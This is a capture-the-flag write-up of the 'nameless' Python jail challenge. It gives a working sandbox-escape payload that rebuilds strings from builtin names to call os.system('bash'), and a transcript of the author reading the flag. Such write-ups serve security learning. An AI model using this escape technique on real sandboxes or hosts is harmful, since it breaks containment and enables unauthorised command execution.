# nameless
## Misc (498 points) by sera

> obligatory unrealistic sandbox escape challenge!!!!!!! server runs python:3.11.1 docker!!!!!

## Attachments
- `nc nameless.chal.irisc.tf 10301`
- [chal.py](assets/nameless/chal.py)

## Solution

This was a super fun pyjail, and the first time I've really gotten deep into one. Let's take a look at `chal.py`.

```python
#!/usr/bin/python3

code_type = type(compile("1", "Code", "exec"))

go = input("Code: ")
res = compile(go, "home", "eval")

def clear(code):
    print(">", code.co_names)
    new_consts = []
    for const in code.co_consts:
        print("C:", const)
        if isinstance(const, code_type):
            new_consts.append(clear(const))
        elif isinstance(const, int):
            new_consts.append(0)
        elif isinstance(const, str):
            new_consts.append("")
        elif isinstance(const, tuple):
            new_consts.append(tuple(None for _ in range(len(const))))
        else:
            new_consts.append(None)
    return code.replace(co_names=(), co_consts=tuple(new_consts))

res = clear(res)
del clear
del go
del code_type

# Go!
res = eval(res, {}, {})
print(res(vars(), vars))
```

What we see in this program is that the code we provide is compiled, then the constants are changed: all numbers are changed to 0, strings to the empty string, tuples to tuples of None, and any other constants (such as floating point numbers) to None. As part of this code, we are given the output of `vars()` and the `vars` function as input. Let's quickly take a look at what these do:

```python
>>> vars()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>}
>>> vars()['__builtins__']
<module 'builtins' (built-in)>
>>> vars(vars()['__builtins__'])
{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), ...}
```

`vars()` gives us the high level variables, such as the builtins module, while the `vars` function allows us to view the key-value pairs of modules. As part of the pyjail, our ultimate goal is to open a shell on the remote server. The most basic code is:

```python
import os
os.system('bash')
```

Unfortunately, we can't have two statements in a lambda. To circumvent this, we can use:

```python
__import__('os').system('bash')
```

Awesome, let's just wrap this in a lambda function and send it to the server!

```python
lambda x, y: __import__('os').system('bash')
```

```python
(chal.py)
Code: lambda x, y: __import__('os').system('bash')
> ()
C: <code object <lambda> at 0x1008d66b0, file "home", line 1>
> ('__import__', 'system')
C: None
C: os
C: bash
C: <lambda>
[1]    33309 segmentation fault  python3 chal.py
```

Well, that's the first time I've seen Python segfault. So, what went wrong here?

We've got a few things that are problematic:

- Obvious one: our strings are getting cleared.
- Slightly less obvious from this example: we can't actually call the builtin functions directly. This is easy to see if we use the code `lambda x, y: str(x)`:

```python
(chal.py)
Code: lambda x, y: str(x)
> ()
C: <code object <lambda> at 0x1009966b0, file "home", line 1>
> ('str',)
C: None
C: <lambda>
[1]    33514 segmentation fault  python3 chal.py
```

Even though we're not even trying to do anything sneaky here, we're unable to call `str`. Time for our backup plan...

Let's just run some stuff in a regular Python 3.11 Docker container so we can test:

```python
(Python 3.11)
>>> vars()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>}
>>> vars().keys()
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__annotations__', '__builtins__'])
```

Awesome, we can get strings that way, right?

Right?

```python
(chal.py)
Code: lambda x, y: x.keys()
> ()
C: <code object <lambda> at 0x1009fa6b0, file "home", line 1>
> ('keys',)
C: None
C: <lambda>
[1]    33752 segmentation fault  python3 chal.py
```

_Sigh_. Ok.

```python
(Python 3.11)
>>> [k for k in vars()]
['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__annotations__', '__builtins__']
```

```python
(chal.py)
Code: lambda x, y: [k for k in x]
> ()
C: <code object <lambda> at 0x100456760, file "home", line 1>
> ()
C: None
C: <code object <listcomp> at 0x1004566b0, file "home", line 1>
> ()
C: <lambda>.<locals>.<listcomp>
C: <lambda>
['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__annotations__', '__builtins__', '__file__', '__cached__', 'res']
```

There we go! Now, we just need to access the member variables.

```python
(Python 3.11)
>>> # Let's set these up so we can lambda-ify easier later
>>> x = vars()
>>> y = vars
>>> x[[k for k in x][6]]
<module 'builtins' (built-in)>
```

Yay! Let's test this on the challenge.

```python
(chal.py)
Code: lambda x, y: x[[k for k in x][6]]
> ()
C: <code object <lambda> at 0x1007de760, file "home", line 1>
> ()
C: None
C: <code object <listcomp> at 0x1007de6b0, file "home", line 1>
> ()
C: <lambda>.<locals>.<listcomp>
C: 6
C: <lambda>
__main__
```

Oh, right. Numbers. Ok... we can fix that. With another level of indirection.

(Python started lazy evaluating my constants so I had to pass it in by lambda)

```python
(Python 3.11)
>>> x[[k for k in x][(lambda z: -~-~-~-~-~-~0)(0)]]
<module 'builtins' (built-in)>
```

If you're wondering what `-~` is doing: we take the negation of a bit flip. Integers are represented as two's complement, and when we take the negative of a two's complement number, we flip its bits and add 1. Thus, flipping a number's bits first and then taking the negative will add one! Repeat this as many times as needed to generate the correct number.

From here, we need to actually access builtins. Let's start with import. If we take a look at the keys of the `__builtins__` module, we see:

```python
(Python 3.11)
>>> vars(x['__builtins__']).keys()
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__build_class__', '__import__', 'abs', 'all', 'any', 'ascii', 'bin', 'breakpoint', 'callable', 'chr', 'compile', 'delattr', 'dir', 'divmod', 'eval', 'exec', 'format', 'getattr', 'globals', 'hasattr', 'hash', 'hex', 'id', 'input', 'isinstance', 'issubclass', 'iter', 'aiter', 'len', 'locals', 'max', 'min', 'next', 'anext', 'oct', 'ord', 'pow', 'print', 'repr', 'round', 'setattr', 'sorted', 'sum', 'vars', 'None', 'Ellipsis', 'NotImplemented', 'False', 'True', 'bool', 'memoryview', 'bytearray', 'bytes', 'classmethod', 'complex', 'dict', 'enumerate', 'filter', 'float', 'frozenset', 'property', 'int', 'list', 'map', 'object', 'range', 'reversed', 'set', 'slice', 'staticmethod', 'str', 'super', 'tuple', 'type', 'zip', '__debug__', 'BaseException', 'BaseExceptionGroup', 'Exception', 'GeneratorExit', 'KeyboardInterrupt', 'SystemExit', 'ArithmeticError', 'AssertionError', 'AttributeError', 'BufferError', 'EOFError', 'ImportError', 'LookupError', 'MemoryError', 'NameError', 'OSError', 'ReferenceError', 'RuntimeError', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SystemError', 'TypeError', 'ValueError', 'Warning', 'FloatingPointError', 'OverflowError', 'ZeroDivisionError', 'BytesWarning', 'DeprecationWarning', 'EncodingWarning', 'FutureWarning', 'ImportWarning', 'PendingDeprecationWarning', 'ResourceWarning', 'RuntimeWarning', 'SyntaxWarning', 'UnicodeWarning', 'UserWarning', 'BlockingIOError', 'ChildProcessError', 'ConnectionError', 'FileExistsError', 'FileNotFoundError', 'InterruptedError', 'IsADirectoryError', 'NotADirectoryError', 'PermissionError', 'ProcessLookupError', 'TimeoutError', 'IndentationError', 'IndexError', 'KeyError', 'ModuleNotFoundError', 'NotImplementedError', 'RecursionError', 'UnboundLocalError', 'UnicodeError', 'BrokenPipeError', 'ConnectionAbortedError', 'ConnectionRefusedError', 'ConnectionResetError', 'TabError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeTranslateError', 'ExceptionGroup', 'EnvironmentError', 'IOError', 'open', 'quit', 'exit', 'copyright', 'credits', 'license', 'help', '_'])
```

This will come in handy later as well, so I'm showing the full output. Here, we see that `__import__` is found at index 6. Thus, we can find it using the specific key and the `vars` function:

```python
(Python 3.11)
>>> [k for k in y(x['__builtins__'])][6]
'__import__'
>>> y(x[[k for k in x][6]])[[k for k in y(x['__builtins__'])][6]]
<built-in function __import__>
```

Awesome, we can now access `__import__`. Next, let's figure out how to get the string `'os'`. We can piece together `os` by indexing into the key names and splicing them together. I ended up creating a text document keeping track of all of these:

```
6 = __import__

11 = bin
7 = abs
25 = hash

11[0] = b
7[0] = a
7[2] = s
25[0] = h

23 = globals
23[2] = o
23[6] = s

7 = abs
9 = any
7[2] = s
9[2] = y
7[2] = s

6 = __import__
6[7] = t

0 = __name__
0[5] = e
0[4] = m
```

Now from here, we just have to create a lambda that pieces everything together!

```python
lambda x, y: (lambda b: (lambda vars, keys, builtins, _import, _abs, _any, _bin, _globals, _hash, zero, two, four, five, six, seven: y(vars[keys[_import]](keys[_globals][two]+keys[_globals][six]))[keys[_abs][two]+keys[_any][two]+keys[_abs][two]+keys[_import][seven]+keys[0][five]+keys[0][four]](keys[_bin][0]+keys[_abs][0]+keys[_abs][two]+keys[_hash][0]) )(y(b), [k for k in y(b)],b,(lambda z: -~-~-~-~-~-~z)(0),(lambda z: -~-~-~-~-~-~-~z)(0),(lambda z: -~-~-~-~-~-~-~-~-~z)(0),(lambda z: -~-~-~-~-~-~-~-~-~-~-~z)(0),(lambda z: -~(z+z))((lambda z: -~-~-~-~-~-~-~-~-~-~-~z)(0)),(lambda z: z+z+z+z+z)((lambda z: -~-~-~-~-~z)(0)),0,(lambda z: -~-~z)(0),(lambda z: -~-~-~-~z)(0),(lambda z: -~-~-~-~-~z)(0),(lambda z: -~-~-~-~-~-~z)(0),(lambda z: -~-~-~-~-~-~-~z)(0)))(x[[k for k in x][(lambda z: (z + z) * (z + z + z))((lambda z: -~z)(0))]])
```

(Yes, this is the actual solution I had. It was slightly overkill because the flag was at `/flag`. But hey, prepare for the worst.)

Let's break this into pieces by formatting it better.

```python
lambda x, y: (
  lambda b: (
    lambda vars, keys, builtins, _import, _abs, _any, _bin, _globals, _hash, zero, two, four, five, six, seven: 
      y(
        vars[keys[_import]](
          keys[_globals][two]+keys[_globals][six] # "os"
        )
      )[
        # "system"
        keys[_abs][two]+keys[_any][two]+keys[_abs][two]+keys[_import][seven]+keys[0][five]+keys[0][four]
      ](
        # "bash"
        keys[_bin][0]+keys[_abs][0]+keys[_abs][two]+keys[_hash][0]
      )
    )(
      y(b), 
      [k for k in y(b)],
      b,
      (lambda z: -~-~-~-~-~-~z)(0),
      (lambda z: -~-~-~-~-~-~-~z)(0),
      (lambda z: -~-~-~-~-~-~-~-~-~z)(0),
      (lambda z: -~-~-~-~-~-~-~-~-~-~-~z)(0),
      (lambda z: -~(z+z))(
        (lambda z: -~-~-~-~-~-~-~-~-~-~-~z)(0)
      ),
      (lambda z: z+z+z+z+z)(
        (lambda z: -~-~-~-~-~z)(0)
      ),
      0,
      (lambda z: -~-~z)(0),
      (lambda z: -~-~-~-~z)(0),
      (lambda z: -~-~-~-~-~z)(0),
      (lambda z: -~-~-~-~-~-~z)(0),
      (lambda z: -~-~-~-~-~-~-~z)(0)
    )
  )(
    x[[k for k in x][
      (lambda z: (z + z) * (z + z + z))((lambda z: -~z)(0))
    ]]
  )
```

Let's take a look at the design of this:
- We have our large outer lambda that takes `x = vars()` and `y = vars`.
- This lambda calls an inner lambda that takes `b`, which is the builtins module. Really the only reason for this is because I didn't want to have to modify 3 instances of `x[[k for k in x][6]]`. Don't repeat yourself!
- The inner lambda calls yet _another_ inner lambda, which takes... a lot of parameters. Yes, some of the numbers overlap and I could have made this simpler, or just calculated the numbers on the fly! But as much as Python code like this should never be written in an actual production setting, I decided to try to keep some semblance of "good programming convention" and make the code (relatively) easy to read. So, we have `vars`, which represents the output of `vars(b)`, we have `keys`, which is all of the keys of `vars(b)`, and we have `builtins`, which is just `b` itself. After this, we have the indices representing all of the functions we need, either to call or to generate strings, and then we have the indices to generate strings! (This is the one time that naming a variable `zero` when it stores `0` actually is useful). We utilize `-~` multiple times, and when I felt the lines got too long, I added another lambda to calculate from intermediate values.
- Inside the innermost lambda is actually relatively readable: we call `__import__` on `"os"`, then look up the `system` function inside it, then call it with `"bash"`. It's mainly just the setup that is time-consuming.

When I ran the code, nothing showed up at first, and I was a bit scared I hadn't managed to open a shell. But after typing `ls`, everything showed up, so I was able to find the flag!

```
Code: lambda x, y: (lambda b: (lambda vars, keys, builtins, _import, _abs, _any, _bin, _globals, _hash, zero, two, four, five, six, seven: y(vars[keys[_import]](keys[_globals][two]+keys[_globals][six]))[keys[_abs][two]+keys[_any][two]+keys[_abs][two]+keys[_import][seven]+keys[0][five]+keys[0][four]](keys[_bin][0]+keys[_abs][0]+keys[_abs][two]+keys[_hash][0]) )(y(b), [k for k in y(b)],b,(lambda z: -~-~-~-~-~-~z)(0),(lambda z: -~-~-~-~-~-~-~z)(0),(lambda z: -~-~-~-~-~-~-~-~-~z)(0),(lambda z: -~-~-~-~-~-~-~-~-~-~-~z)(0),(lambda z: -~(z+z))((lambda z: -~-~-~-~-~-~-~-~-~-~-~z)(0)),(lambda z: z+z+z+z+z)((lambda z: -~-~-~-~-~z)(0)),0,(lambda z: -~-~z)(0),(lambda z: -~-~-~-~z)(0),(lambda z: -~-~-~-~-~z)(0),(lambda z: -~-~-~-~-~-~z)(0),(lambda z: -~-~-~-~-~-~-~z)(0)))(x[[k for k in x][(lambda z: (z + z) * (z + z + z))((lambda z: -~z)(0))]])
ls
chal.py
ls -a
.
..
chal.py
ls /
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat /flag
irisctf{i_made_this_challenge_so_long_ago_i_hope_there_arent_10000_with_this_idea_i_missed}
```

Haven't seen it before, and great challenge :)
